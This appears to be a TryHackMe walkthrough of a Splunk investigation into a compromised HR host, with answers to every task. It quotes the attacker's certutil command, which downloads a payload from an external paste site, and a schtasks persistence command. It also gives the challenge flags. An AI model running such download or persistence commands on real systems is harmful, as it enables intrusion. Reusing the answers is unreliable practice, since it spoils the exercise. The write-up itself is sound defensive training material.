---
title: Benign
description: Challenge room to investigate a compromised host.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this challenge room, we use Splunk to investigate Windows process creation logs (`EventID 4688`) across the HR department (`HR_01` and `HR_02`) during March 2022. By analyzing rare usernames and command-line arguments, we uncover a typosquatted imposter account (`Amel1a`), persistence via `schtasks.exe`, and a Living-off-the-Land (`certutil.exe`) payload download from `controlc.com`.

---

## Task 1.1
How many logs are ingested from the month of March, 2022?

**Answer**: `13,959` (or `13959`)

**Why?**
Setting the Splunk time range picker to `during Mar 2022` (`3/1/22 12:00:00.000 AM to 4/1/22 12:00:00.000 AM`) and querying `index=*` returns `13,959 events`.

![](../../assets/Pasted%20image%2020261114200415.png)

## Task 1.2
Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?

**Answer**: `Amel1a`

**Why?**
Clicking on `UserName` in the Interesting Fields sidebar shows `11 Values`, with only the top 10 values displayed (`SYSTEM`, `Moin`, `James`, `Katrina`, `haroon`, `Chris.fort`, `deepak`, `Daina`, `Bell`, `Amelia`). Running `index=* | rare limit=20 UserName` reveals the 11th account with a single event (`count: 1`), `Amel1a`, which substitutes the letter `i` in `Amelia` with the number `1`.

![](../../assets/Pasted%20image%2020261114200502.png)

## Task 1.3
Confirming the imposter account via the `rare` command visualization:

**Answer**: `Amel1a`

**Why?**
In the `index=* | rare limit=20 UserName` line chart and statistics table, `Amel1a` stands out at the very top of the rarest users list with `count: 1` (`0.007164%`).

![](../../assets/Pasted%20image%2020261114200621.png)

## Task 1.4
Which user from the HR department was observed to be running scheduled tasks?

**Answer**: `Chris.fort`

**Why?**
Querying `index=* UserName=Daina OR Chris.fort OR haroon schtasks` returns 1 event on host `HR_02`, where user `Chris.fort` executed `C:\Windows\System32\schtasks.exe` with the command line `/create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart`.

![](../../assets/Pasted%20image%2020261114200959.png)

## Task 2.1
Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?

**Answer**: `haroon`

**Why?**
Querying `index=* UserName=Daina OR Chris.fort OR haroon https` returns a single process creation event on host `HR_01` executed by `UserName: haroon`.

![](../../assets/Pasted%20image%2020261114201517.png)

## Task 2.2
To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?

**Answer**: `certutil.exe`

**Why?**
Looking at the `CommandLine` and `ProcessName` fields of `haroon`'s event, the binary used is `C:\Windows\System32\certutil.exe` (`certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe`).

![](../../assets/Pasted%20image%2020261114201622.png)

## Task 2.3
What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)

**Answer**: `2022-03-04`

**Why?**
The event timestamp shows `3/4/22 10:38:28.000 AM` (`EventTime: 2022-03-04T10:38:28Z`), which formats to `2022-03-04`.

![](../../assets/Pasted%20image%2020261114201653.png)

## Task 2.4
Which third-party site was accessed to download the malicious payload?

**Answer**: `controlc.com`

**Why?**
The URL inside the `CommandLine` field points to the domain `controlc.com`.

![](../../assets/Pasted%20image%2020261114201744.png)

## Task 2.5
What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?

**Answer**: `benign.exe`

**Why?**
At the end of the `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe` command, the output filename specified on the host is `benign.exe`.

![](../../assets/Pasted%20image%2020261114201806.png)

## Task 2.6
The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?

**Answer**: `THM{KJ&*H^B0}`

**Why?**
Opening the URL `https://controlc.com/e4d11035` in a browser loads a paste titled `flag.txt` containing the flag `THM{KJ&*H^B0}`.

![](../../assets/Pasted%20image%2020261114201843.png)

## Task 2.7
What is the URL that the infected host connected to?

**Answer**: `https://controlc.com/e4d11035`

**Why?**
Copying the full URL directly from the `CommandLine` field of the `certutil.exe` event gives `https://controlc.com/e4d11035`.

![](../../assets/Pasted%20image%2020261114201923.png)